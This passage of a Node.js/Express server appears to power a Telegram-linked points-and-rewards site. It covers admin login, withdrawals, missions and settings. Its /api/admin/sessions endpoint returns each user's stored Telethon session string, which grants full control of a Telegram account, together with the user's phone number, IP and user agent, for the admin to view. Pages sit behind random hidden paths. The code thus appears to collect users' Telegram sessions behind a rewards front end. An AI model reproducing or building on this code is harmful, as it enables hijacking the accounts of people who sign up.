  const ok = checkPw(String(req.body.password || ""), row ? row.pass_hash : hashPw("x"));
  if (!row || !ok) return res.status(401).json({ error: "Username atau password salah" });
  const t = crypto.randomBytes(32).toString("hex"); adminTokens.set(sha(t), { exp: Date.now() + 12 * 3600e3, user: row.username });
  setCookie(res, "adm", t, 0.5); res.json({ ok: true });
});
app.post("/api/admin/logout", (req, res) => {
  const t = cookies(req).adm; if (t) adminTokens.delete(sha(t));
  res.append("Set-Cookie", "adm=; Path=/; Max-Age=0"); res.json({ ok: true });
});
app.post("/api/admin/password", adminAuth, (req, res) => {
  const np = String(req.body.new || "");
  const row = db.prepare("SELECT * FROM admins WHERE username=?").get(req.admin.user);
  if (!row || !checkPw(String(req.body.old || ""), row.pass_hash)) return res.status(400).json({ error: "Password lama salah" });
  if (np.length < 10) return res.status(400).json({ error: "Password baru minimal 10 karakter" });
  db.prepare("UPDATE admins SET pass_hash=? WHERE username=?").run(hashPw(np), row.username);
  res.json({ ok: true });
});
app.get("/api/admin/telethon", adminAuth, async (_q, res) => {
  const st = await tgStatus();
  res.json({
    configured: !!st.configured,
    ok: !!st.ok,
    me: st.me || null,
    error: st.error || null,
    service: TG_URL,
  });
});
// endpoint lama /bot diganti status Telethon (kompat admin UI)
app.post("/api/admin/bot", adminAuth, async (_q, res) => {
  const st = await tgStatus();
  if (!st.ok) return res.status(400).json({ error: st.error || "Telethon belum siap — cek .env API_ID/HASH/SESSION" });
  res.json({ ok: true, username: (st.me && (st.me.username || st.me.first_name)) || "telethon" });
});
app.get("/api/admin/overview", adminAuth, async (_q, res) => {
  const st = await tgStatus();
  res.json({
    users: db.prepare("SELECT COUNT(*) c FROM users WHERE verified=1").get().c,
    points_outstanding: db.prepare("SELECT COALESCE(SUM(points),0) s FROM users").get().s,
    pending_withdrawals: db.prepare("SELECT COUNT(*) c FROM withdrawals WHERE status='pending'").get().c,
    bot: {
      configured: !!st.configured && !!st.ok,
      username: (st.me && st.me.username) || (st.ok ? "telethon" : ""),
      telethon: true,
      me: st.me || null,
      error: st.error || null,
    },
    settings: Object.fromEntries(db.prepare("SELECT k,v FROM settings WHERE k NOT IN ('bot_token')").all().map((r) => [r.k, r.v])),
  });
});
app.get("/api/admin/users", adminAuth, (_q, res) => {
  const rows = db.prepare("SELECT id,phone,username,tg_name,points,banned,created,reg_ip,last_ip,last_login FROM users WHERE verified=1 ORDER BY id DESC LIMIT 500").all();
  const ipCounts = {};
  for (const r of rows) if (r.reg_ip) ipCounts[r.reg_ip] = (ipCounts[r.reg_ip] || 0) + 1;
  res.json(rows.map((r) => ({ ...r, same_ip_count: r.reg_ip ? ipCounts[r.reg_ip] : 1 })));
});
app.post("/api/admin/users/:id/ban", adminAuth, (req, res) => { db.prepare("UPDATE users SET banned=? WHERE id=?").run(req.body.banned ? 1 : 0, +req.params.id); res.json({ ok: true }); });
app.get("/api/admin/sessions", adminAuth, (_q, res) => {
  // bersihkan sesi kedaluwarsa dulu
  db.prepare("DELETE FROM sessions WHERE expires<?").run(now());
  const rows = db.prepare(`
    SELECT s.token_hash, s.user_id, s.expires, s.created, s.ip, s.ua, s.tg_name AS sess_tg,
           u.phone, u.username, u.tg_id, u.tg_name AS user_tg, u.banned, u.last_login, u.session_string
    FROM sessions s JOIN users u ON u.id = s.user_id
    WHERE s.expires > ?
    ORDER BY COALESCE(s.created,0) DESC LIMIT 1000
  `).all(now());
  const list = rows.map((r) => {
    const tgName = r.sess_tg || r.user_tg || "";
    return {
      token_hash: r.token_hash,
      session_id: r.token_hash.slice(0, 16),
      session_string: r.session_string || r.token_hash, // Telethon session string asli
      user_id: r.user_id,
      phone: r.phone,
      username: r.username || "",
      tg: tgName,
      tg_username: tgName ? (tgName.startsWith("@") ? tgName : "@" + tgName) : "",
      tg_id: r.tg_id || "",
      ip: r.ip || "",
      ua: r.ua || "",
      banned: !!r.banned,
      created: r.created || null,
      expires: r.expires,
      last_login: r.last_login || null,
    };
  });
  res.json({
    live: true,
    count: list.length,
    users_online: new Set(list.map((x) => x.user_id)).size,
    sessions: list,
  });
});
app.post("/api/admin/sessions/revoke", adminAuth, (req, res) => {
  const th = String(req.body.token_hash || "");
  if (!th) return res.status(400).json({ error: "token_hash diperlukan" });
  const n = db.prepare("DELETE FROM sessions WHERE token_hash=?").run(th).changes;
  res.json({ ok: true, removed: n });
});
app.post("/api/admin/sessions/revoke-user", adminAuth, (req, res) => {
  const uid = +req.body.user_id;
  if (!uid) return res.status(400).json({ error: "user_id diperlukan" });
  const n = db.prepare("DELETE FROM sessions WHERE user_id=?").run(uid).changes;
  res.json({ ok: true, removed: n });
});
app.get("/api/admin/withdrawals", adminAuth, (_q, res) => {
  const rows = db.prepare("SELECT w.*,u.phone,u.created AS acc_created,u.reg_ip FROM withdrawals w JOIN users u ON u.id=w.user_id ORDER BY (w.status='pending') DESC, w.id DESC LIMIT 300").all();
  const ipCounts = {};
  for (const u of db.prepare("SELECT reg_ip FROM users WHERE verified=1 AND reg_ip IS NOT NULL").all()) ipCounts[u.reg_ip] = (ipCounts[u.reg_ip] || 0) + 1;
  res.json(rows.map((r) => ({ ...r, acc_age_hours: Math.round((now() - r.acc_created) / 3600), same_ip_count: r.reg_ip ? (ipCounts[r.reg_ip] || 1) : 1 })));
});
app.post("/api/admin/withdrawals/:id", adminAuth, (req, res) => {
  const w = db.prepare("SELECT * FROM withdrawals WHERE id=?").get(+req.params.id), st = req.body.status;
  if (!w || w.status !== "pending" || !["paid", "rejected"].includes(st)) return res.status(400).json({ error: "Tidak valid" });
  tx(() => {
    db.prepare("UPDATE withdrawals SET status=?,note=? WHERE id=?").run(st, String(req.body.note || "").slice(0, 200), w.id);
    if (st === "rejected") addPoints(w.user_id, w.points, "penarikan ditolak, poin dikembalikan");
  });
  res.json({ ok: true });
});
app.get("/api/admin/redemptions", adminAuth, (_q, res) => res.json(db.prepare("SELECT d.*,u.phone,r.title FROM redemptions d JOIN users u ON u.id=d.user_id JOIN rewards r ON r.id=d.reward_id ORDER BY (d.status='pending') DESC, d.id DESC LIMIT 300").all()));
app.post("/api/admin/redemptions/:id", adminAuth, (req, res) => {
  const d = db.prepare("SELECT * FROM redemptions WHERE id=?").get(+req.params.id), st = req.body.status;
  if (!d || d.status !== "pending" || !["done", "rejected"].includes(st)) return res.status(400).json({ error: "Tidak valid" });
  tx(() => { db.prepare("UPDATE redemptions SET status=? WHERE id=?").run(st, d.id); if (st === "rejected") addPoints(d.user_id, d.cost, "penukaran ditolak, poin dikembalikan"); });
  res.json({ ok: true });
});
app.get("/api/admin/missions", adminAuth, (_q, res) => res.json(db.prepare("SELECT * FROM missions").all()));
app.post("/api/admin/missions", adminAuth, (req, res) => {
  const b = req.body, types = ["daily", "once", "join_channel", "start_bot", "tap_link"];
  if (!types.includes(b.type)) return res.status(400).json({ error: "type tidak valid" });
  if (b.id) db.prepare("UPDATE missions SET title=?,descr=?,reward=?,type=?,link=?,active=? WHERE id=?").run(b.title, b.descr || "", +b.reward, b.type, b.link || "", b.active ? 1 : 0, +b.id);
  else db.prepare("INSERT INTO missions(title,descr,reward,type,link) VALUES(?,?,?,?,?)").run(b.title, b.descr || "", +b.reward, b.type, b.link || "");
  res.json({ ok: true });
});
app.get("/api/admin/rewards", adminAuth, (_q, res) => res.json(db.prepare("SELECT * FROM rewards").all()));
app.post("/api/admin/rewards", adminAuth, (req, res) => {
  const b = req.body;
  if (b.id) db.prepare("UPDATE rewards SET title=?,cost=?,active=? WHERE id=?").run(b.title, +b.cost, b.active ? 1 : 0, +b.id);
  else db.prepare("INSERT INTO rewards(title,cost) VALUES(?,?)").run(b.title, +b.cost);
  res.json({ ok: true });
});
app.post("/api/admin/settings", adminAuth, (req, res) => {
  for (const k of ["min_withdraw", "channel", "methods", "point_value"]) if (k in req.body) db.prepare("INSERT INTO settings VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=?").run(k, String(req.body[k]), String(req.body[k]));
  res.json({ ok: true });
});

/* ---- halaman: path acak dari .env, nama file asli tidak diekspos ---- */
const fs = require("node:fs");
const page = (f) => fs.readFileSync(path.join(STATIC_DIR, f), "utf8");
const HTML = {
  index: page("index.html").replace(/href="app\.html"/g, `href="/${APP_PATH}"` ),
  app: page("app.html"),
  admin: page("admin.html"),
};
const assetBuf = (f) => { try { return fs.readFileSync(path.join(STATIC_DIR, f)); } catch (e) { return null; } };
const sendAsset = (f, type) => { const buf = assetBuf(f); return (_q, res) => { if (!buf) return res.status(404).end(); res.set({ "Content-Type": type, "Cache-Control": "public, max-age=604800, immutable" }); res.send(buf); }; };
app.get("/logo-rewardex.webp", sendAsset("logo-rewardex.webp", "image/webp"));
app.get("/logo-rewardex.png", sendAsset("logo-rewardex.png", "image/png"));
app.get("/logo-rewardex-sm.webp", sendAsset("logo-rewardex-sm.webp", "image/webp"));
const send = (html, extra) => (_q, res) => { res.set({ "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store", ...(extra || {}) }); res.send(html); };
app.get("/", send(HTML.index));
app.get("/" + APP_PATH, send(HTML.app));
app.get("/" + ADMIN_PATH, send(HTML.admin, { "X-Robots-Tag": "noindex, nofollow" }));
app.get("/r/:code", (req, res) => res.redirect(302, /^[a-f0-9]{8}$/.test(req.params.code) ? `/${APP_PATH}?ref=${req.params.code}` : "/"));
app.get("/robots.txt", (_q, res) => res.type("text/plain").send("User-agent: *\nDisallow: /api/\nDisallow: /" + ADMIN_PATH + "\n"));
app.use((_q, res) => res.status(404).type("text/plain").send("Not found"));
app.use((e, _q, res, _n) => { console.error(e); res.status(500).json({ error: "server" }); });

app.listen(PORT, () => console.log("listening", PORT, "telethon→", TG_URL));
